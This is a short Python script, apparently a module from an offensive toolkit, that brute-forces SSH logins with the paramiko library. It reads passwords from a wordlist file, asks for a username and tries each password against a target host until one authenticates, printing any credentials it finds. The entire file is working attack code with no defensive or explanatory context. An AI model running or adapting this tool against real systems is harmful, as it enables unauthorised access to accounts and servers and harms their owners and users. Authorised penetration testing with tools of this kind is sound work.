import paramiko

def run(target, port=22, wordlist_file="default_wordlist.txt"):
    print(f"\n[+] Starting brute-force on {target}:{port}...\n")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Load passwords from wordlist file
    try:
        with open(wordlist_file, "r") as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print("[-] Wordlist file not found!")
        return

    # Ask user which username to attack
    username = input("Enter username to brute-force: ").strip()

    for pw in passwords:
        try:
            ssh.connect(target, port=port, username=username, password=pw, timeout=1)
            print(f"[+] Found credentials: {username}:{pw}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"[-] Tried {username}:{pw} ❌")
            continue
        except paramiko.SSHException as e:
            print(f"[-] SSH error: {e}")
            continue
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            continue

    print("[-] No credentials found")
